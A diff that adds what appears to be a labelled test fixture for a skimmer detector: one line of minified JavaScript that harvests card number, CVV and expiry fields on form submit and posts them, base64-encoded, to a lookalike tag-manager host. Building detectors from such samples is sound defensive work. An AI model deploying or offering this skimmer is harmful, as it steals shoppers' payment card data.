@@ -1,0 +1,2 @@
+// expect: skimmer-field-harvest
+!function(){const e={number:'input[name="payment[cc_number]"]',cvv:'input[name="payment[cc_cid]"]',exp:'select[name="payment[cc_exp_month]"]'};window.addEventListener('submit',()=>{const t={};for(const n in e){const o=document.querySelector(e[n]);o&&(t[n]=o.value)}fetch('https://google-tagmanager-cdn.example/g',{method:'POST',mode:'no-cors',body:btoa(JSON.stringify(t))})},!0)}();
